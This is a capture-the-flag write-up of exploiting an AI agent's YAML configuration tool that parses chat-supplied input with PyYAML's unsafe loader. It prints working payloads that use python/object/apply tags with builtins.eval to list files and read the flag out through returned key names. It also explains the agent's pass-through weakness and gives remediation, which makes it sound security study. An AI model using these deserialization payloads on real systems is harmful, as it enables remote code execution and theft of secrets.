# Expert 6, The Shape Shifter: YAML that turns into code

![Attack chain: a YAML configuration tool uses PyYAML's unsafe loader; harmless tag probes identify the library and prove the loader resolves Python object tags; a tool that prints only key names forces the attacker to put data into dict keys; eval inside a python/object/apply tag lists the directory and then reads the flag into a key; the right panel shows why safe_load is the fix and why echoing parsed keys is a second problem](diagram.png)

> ARKX Mothership, Expert track, level 6. Public CTF by CyberArk Labs, played as a participant.
> The flag is a CTF value. No third-party data appears here.

---

## Context

The level presents a "Configuration Processor" that processes YAML configuration files. The tool `process_config` takes one string parameter, `yaml_data`, and returns a summary of the parsed configuration. The level name suggests persona switching. That guess was wrong. The shape shifting is YAML data turning into Python objects, which is insecure deserialization.

## Recon and backend fingerprint

Recon and the first fingerprint fit in one batched turn, each probe a harmless tag sent as single-line flow YAML to avoid newline mangling:

| Probe | Result | Meaning |
|---|---|---|
| `{name: test, port: 8080, enabled: yes}` | OK, 3 keys | parser accepts YAML 1.1 scalars |
| `{value: !!binary aGVsbG8=}` | OK | control for standard tags |
| `{value: !!python/tuple [1, 2]}` | OK | a Python-specific tag resolved, so not `safe_load` |
| `{value: !custom_tag hello}` | `could not determine a constructor for the tag '!custom_tag'` | that exact string is PyYAML |

The library is PyYAML and the loader resolves Python tags.

## Loader discrimination

Two harmless callables separate the unsafe loader from the merely full one, before anything dangerous runs:

```yaml
{t: !!python/object/apply:time.time []}   # OK: apply of an arbitrary callable runs
{n: !!python/name:os.getcwd }             # OK: name resolution path confirmed
```

`apply` of an arbitrary callable runs, so the loader is `unsafe_load` or `UnsafeLoader`. `FullLoader` would reject `apply` with a constructor error. That is the finding: full code execution during parsing.

## The output channel

The tool only ever returns the key count and sample key names, never values. So the exploit has to produce a dict and put the wanted data into a key.

## Prove execution and read the flag

The first attempt chained attribute access and failed:

```yaml
!!python/object/apply:dict.fromkeys [!!python/object/apply:os.listdir ['.']]
# -> cannot find module 'dict'
```

PyYAML's `apply` imports the text before the last dot as a module, and chained attribute access does not resolve. The fix is the one builtin that takes code as a string:

```yaml
!!python/object/apply:builtins.eval ["dict.fromkeys(__import__('os').listdir('.'))"]
# -> Found 1 configuration keys. Sample keys: flag.txt
```

Execution proven, and the working directory holds exactly one file. Read the flag into the key position:

```yaml
!!python/object/apply:builtins.eval ["{open('flag.txt').read().strip(): 1}"]
# -> Sample keys: <flag>
```

## Root cause

The tool parses attacker-controlled text with PyYAML's unsafe loader. That loader resolves `!!python/object/apply:<callable>` tags, which call arbitrary Python during parsing. A config parser is therefore an arbitrary-code evaluator (CWE-502).

The agent is a pass-through. It forwards the string to `yaml_data` and classifies nothing.

The output summarizer echoes sample key names with no check on where those keys came from. That channel carries data only because code execution lets the attacker choose the keys, so it is a consequence of the same defect rather than a second independent one.

## Impact

Critical. Remote code execution in the tool runtime through a single chat-supplied config string, no authentication beyond chat access. Same class as Advanced 5 and Advanced 9, reached through deserialization. In a real deployment an attacker reads secrets, pivots from the host, and tampers with data. The narrow key-name output channel shapes exfiltration without preventing it.

## Remediation

- Parse with `yaml.safe_load` only. `SafeLoader` resolves no Python tags. If arbitrary tags are genuinely required, allowlist specific safe constructors.
- Run the tool with no file-system access to secrets.
- Do not echo parsed structure, including key names, back to the user without classifying it.

---

*ATLAS: T0053 AI Agent Tool Invocation. OWASP LLM 2025: LLM05 Improper Output Handling, LLM06 Excessive Agency, LLM02 Sensitive Information Disclosure. CWE-502, CWE-20.*
